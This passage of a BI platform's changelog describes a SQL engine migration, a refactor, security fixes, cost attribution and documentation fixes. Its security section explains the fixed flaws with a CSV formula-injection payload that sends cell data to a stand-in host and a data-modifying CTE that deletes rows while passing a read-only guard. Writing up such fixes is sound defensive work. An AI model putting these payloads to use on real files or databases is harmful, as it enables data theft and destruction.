  used to execute in AlaSQL in the browser and DuckDB on the server, and the
  two disagreed. Measured across the 61 NL-to-SQL reference queries, AlaSQL
  answered 56 — and **three of the five failures were silent**: "share of
  total" dropped its computed column, and a running total returned `0` for
  every row, so a cumulative chart rendered as a flat line with nothing
  reporting an error. `RANK()` and a CTE referenced from a subquery failed
  outright. Joins were identical on both, which is why it went unnoticed.

  The `.wasm` binaries are self-hosted (not fetched from a CDN, so an
  air-gapped deployment still works), emitted as separate assets, and loaded
  lazily. Verify a deployment with **`/engine-check`**, which runs the
  previously-broken queries in the actual browser and reports which bundle it
  selected.

  The engine is ~8 MB, fetched once per browser and cached after. That wait is
  **shown, not hidden**: loading begins when a data page opens rather than when
  Run is pressed, and a **"Starting the SQL engine…" strip with a real progress
  bar** (byte-level, from duckdb-wasm's own callback) appears until it is
  ready — then disappears. If a Content-Security-Policy or proxy blocks
  WebAssembly, it says so and points at `/engine-check` instead of leaving a
  button that does nothing.

  Consequences worth knowing: every local query function is now `async`, and
  ~120 lines of hand-written JavaScript date shims are gone — DuckDB provides
  `strftime`, `date_trunc`, `split_part` and the rest natively. One of those
  shims took `strftime(format, value)` where every real engine takes
  `(value, format)`, so SQL written against it worked in the browser and
  failed on the server.

- **DuckDB is the default local engine on the server**; `LOCAL_ENGINE=alasql`
  is the escape hatch. Rows load through DuckDB's appender rather than one
  parameterised INSERT per row: a 5,000-row aggregate went from 2,152 ms to
  19.6 ms.

### Internal

- **Split the BI builder pane**, 2,664 lines → 1,754, across seven components:
  the AI analyst tab, the ontology editor, the chart-type picker, the table
  multi-select, the SQL editor, the matrix conditional-formatting editor, and
  the three chart option editors (drill hierarchy, time intelligence, reference
  line). Which regions to extract was decided by **measuring how many of the
  parent's values each one uses**, not by line count.

  **The first measurement was wrong, and its shape is worth knowing.** Scanning
  the whole 751-line chart editor gave 84 values and the conclusion "too coupled
  to split". But that block is a chain of `chartType === …` tests that are
  mutually exclusive, so 84 was a union over branches that never render
  together — not the coupling of anything in it. Measured per region, the
  conditional-formatting editor buried inside needed **six** of the parent's
  values for 160 lines, the best ratio in the file. A union over exclusive
  branches is not a coupling measure.

  What remains un-extracted is the field-slot mapping: ~132 lines against 35
  values, which really are fifteen-odd field/setter pairs that have to move
  together. The rule that survives is lines-per-prop — everything extracted
  carries ≥ 9, what stays carries 3.8 — and a test enforces the floor so a
  six-prop component cannot quietly become a thirty-prop one.

  No hook moved. Every extracted component owns no state and receives values
  and setters, so hook order and effect timing are untouched — that is what
  makes it a refactor. The JSX was copied by script and verified verbatim
  against the original after both sides were run through the same formatter,
  since a raw diff flags prettier's re-indentation and hides nothing.

### Security & governance

- **Fixed: one malformed ontology could blank a whole published dashboard.**
  An ontology spec is stored inside a widget's `chart` JSON, and `chart` is one
  of the fields the public sanitiser passes through to anonymous viewers. The
  graph renderer reads `spec.entities`, `spec.relations` **and `spec.domains`**;
  the guard meant to vet it checked only the first two, so a spec without
  `domains` passed and then threw inside render. **There is no error boundary
  anywhere in this app**, so that does not blank one widget — it blanks the
  page, for everyone holding the share link. The guard now checks every field
  the renderer dereferences and actually gates the render, with a "cannot be
  displayed" panel as the fallback. It previously had **zero callers**.
  (Correction to the first version of this note: the app _does_ have an error
  boundary — the router's, via `defaultErrorComponent`. It is per **route**, so
  the throw cost the entire dashboard rather than the whole browser.)

- **Fixed: exported CSVs could carry spreadsheet formulas (CWE-1236).** Excel,
  LibreOffice and Sheets execute a cell starting with `=`, `+`, `-`, `@`, tab or
  carriage return, and RFC-4180 quoting does not stop it — the quotes are
  consumed by the CSV parser and the cell is still a formula. It matters here
  because **the person exporting is not the author of the rows**: they arrive
  from SaaS connector syncs, from datasets another tenant shared, and from
  warehouse queries. `=HYPERLINK("https://x/?d="&A1,"Open")` exfiltrates the
  neighbouring cell when an analyst opens the file and clicks; Sheets runs
  `=IMPORTXML(...)` with no click. Such values are now prefixed with an
  apostrophe, which spreadsheets strip on display. **Numbers are exempt**, so
  `-5` is still `-5` rather than text.
- **Fixed: the dashboard page had a second, worse CSV escaper.** Its inline copy
  did not escape the **header row** at all, tested `/[",
]/` and so missed a
  bare carriage return, and had no formula guard. It now calls the shared
  writer, with a test that fails if a local escaper reappears.
- **Fixed: scheduled alerts counted NULL as zero.** `alertValue` coerced every
  cell with `Number()` and kept whatever was finite — but `Number(null)` is `0`
  and `0` is finite. On a response-time column with one blank row that made
  **avg 97.5 instead of 130 and min 0 instead of 120**, so "alert when
  `min(ms) < 5`" fired on a healthy service; on an all-negative column it made
  `max` 0 instead of the true maximum. `""`, `"   "` and `[]` coerce the same
  way. SQL aggregates ignore NULL and these now do too. This is the unattended
  path — the wrong number arrives as an email with nobody watching.

- **Fixed: the notebook egress allow-list silently accepted entries it could
  never enforce.** The kernel's outbound policy is a squid `dstdomain` ACL, and
  the hostname test allowed digits in every label, so **IP addresses passed**:
  `10.0.0.1` was written as the entry `.10.0.0.1`, which cannot match a request
  to that address. An operator who allow-listed an internal service believed
  egress to it worked; it never did. Fails closed, so it was not a hole — it
  was a security control that quietly did not do what its own configuration
  said. Labels with a leading or trailing hyphen had the same problem. The
  module's header said it was written pure "so the rules can be unit-tested";
  it had no tests, and now has 14.
- **Fixed: `date_of_birth` was not flagged as personal data.** The catalog's
  PII heuristic knew `dob`, `birth_date` and `birthday` but not `birth`, so the
  most common spelling of one of the most sensitive columns there is went
  unmarked. camelCase was invisible too — the terms anchor on `_`/`-`/space
  boundaries and `emailAddress` has none, so a database using that convention
  got no PII detection at all.
- **The PII heuristic had two copies**, in `lib/dataCatalog` and
  `utils/catalog/crawler.server`, the second labelled "client-side mirror of
  the crawler's heuristic". They were identical and nothing would have said so
  if they were not — the same arrangement that let the warehouse read-only
  guard lose its mutation denylist. Now one module, `lib/piiHeuristic`, with a
  test that fails if a second copy appears.
- **Row-level security is now tested.** RLS is on for **all 96 tables**, and
  the seven with no policy are service-role-only infrastructure (locks,
  cursors, the notebook runtime signing key) where deny-all is correct. Six
  tables carry a blanket `USING (true)` read policy; every one is restricted to
  `authenticated`, and they are pinned as an allow-list so a new one has to be
  justified rather than merged quietly.

- **Fixed: the warehouse "read-only" guard allowed writes to a customer's
  production database.** `assertReadOnlySql` was a second, hand-rolled copy of
  the local guard that checked the leading verb and rejected stacked statements
  but had **no mutation denylist**. A data-modifying CTE defeats a leading-verb
  check completely:

  ```sql
  WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d
  ```

  It begins with `WITH`, contains no semicolon, and deletes rows. PostgreSQL
  and all five wire-compatible forks here (CockroachDB, TimescaleDB, AlloyDB,
  Greenplum, YugabyteDB) run data-modifying CTEs, and T-SQL's
  `WITH cte AS (SELECT …) DELETE FROM cte` covers SQL Server and Azure SQL.
  Reachable from the SQL workbench and BI direct-query — and because a **shared
  connection runs as its owner**, a grantee with read access could have deleted
  from the granting tenant's warehouse.

  Both guards now share one implementation and differ only in which leading
  verbs they permit (the warehouse also allows `SHOW`/`DESCRIBE`/`EXPLAIN`).
  This file previously said the two copies should be kept "in sync in spirit";
  they were not, and a test now pins that the only difference is the verb list.

- **Fixed: a column named after a keyword was refused.** `SELECT "update" FROM t`
  and ``SELECT `delete` FROM t`` were rejected by both guards, because only
  string literals were stripped before the denylist ran, not quoted
  identifiers. A false positive on a security check is what eventually
  persuades someone to weaken it.
- **Fixed: the embed BI widget ignored an agent's SQL table allow-list.**
  `/api/embed/chat` is anonymous by design — a stranger types a question and,
  with Visual BI on, the owner's model writes SQL over the owner's data. The
  chat path and the swarm path both applied the owner's `sql_query` allow-list;
  **the widget path passed none**, so an agent restricted to one table still
  had every dataset the owner owns described to the model and could return rows
  from any of them. `describeUserTables` did not even accept an allow-list
  parameter, which is the sharper half: restricting execution while still
  naming the forbidden tables just tells the model what to ask for. Both are
  now applied, and the agent's saved list is read at the route. Absent or empty
  still means unrestricted, matching the chat tool — one surface quietly
  applying a stricter rule than the other is how two paths that must agree stop
  agreeing. [AGENT_CHAT.md](./docs/AGENT_CHAT.md#which-datasets-it-can-read--read-this-before-embedding)
  now says plainly to set the list on any publicly embedded agent.
- **Fixed: a numeric date column collapsed every row into 1970.** A `year`
  column of 2024/2025/2026 was parsed as seconds since the epoch, so all three
  landed ~34 minutes into 1 January 1970. `isMostlyDates` then reported "yes,
  dates", the UI offered the date-grain toggle, and choosing a grain rendered
  one bar where there should have been three — no error, no empty chart. The
  string branch had rejected these values since it was written; the number
  branch never did, so the same column bucketed differently depending on
  whether the loader typed it as text. `lib/biChartMath` had no tests at all
  and now has 29.

- **Per-agent semantic model allow-list**, deny by default. Enabling the
  Semantic Metrics tool alone no longer grants an agent every model in the
  account; it is also enforced when the tool runs, not only in what the agent
  is shown.
- **Swarm scheduler correctness**: the "claim" before a scheduled run was an
  unconditional update and claimed nothing, so two app instances could each
  fire the same scheduled swarm. Also, an interval of zero meant the swarm ran
  every tick, for ever.
- First test coverage for the AES-GCM credential encryption paths and for the
  scheduler.

### Site

- **Cost attribution by person and team**, with a scope switcher and a time
  range, on the dashboard's new **Spend & usage** panel. Spend can be charged
  back rather than only totalled.

  Scope is **authorised server-side, and refused rather than downgraded**:
  "My teams" resolves the groups the caller actually belongs to (never groups
  they name), "Whole organisation" is superadmin-only, and the picker offers
  only what that caller may use. Showing someone their own $12.40 labelled
  "Whole organisation" would be a lie the number itself cannot reveal.

  Team totals **overlap on purpose** — someone in two teams counts in both, so
  the rows do not sum to the total — and the UI says so. Cost reads the same
  column the budget caps do, so a figure here cannot disagree with a budget
  alert. Windows are half-open and UTC.

- Public [Security](/security) and [Licensing & support](/license) pages.
- Dashboard surfaces failed syncs, unreachable connections, failed scheduled
  runs, and budget used this month.

### Documentation

- **Fixed: the docs asked for a Supabase project id that nothing reads.**
  `VITE_SUPABASE_PROJECT_ID` and `SUPABASE_PROJECT_ID` were in
  `.env.example`'s _required_ block, the Dockerfile, compose build args and
  three docs. The CLI takes the ref as `supabase link --project-ref`, a flag.
  A required setup step that did nothing.
- **Fixed: the notebook runtime's env/settings precedence was documented
  backwards**, and it promised a `NOTEBOOK_EGRESS_ALLOWLIST` variable that does
  not exist.
- **Fixed: "all ten connectors"** — written when there were ten, and there are 22. Worse, only ten were _documented_: SQL Server and ClickHouse, which have
  fields nothing else has, had no entry at all.
- Twelve environment variables the code reads were documented nowhere,
  including four rate limits with no other way to discover them.
- `tests/unit/docsFreshness.test.ts` now fails CI on any of these: an env var
  the code reads that no doc mentions, a setting the docs promise that no code
  reads, or a stale connector count.
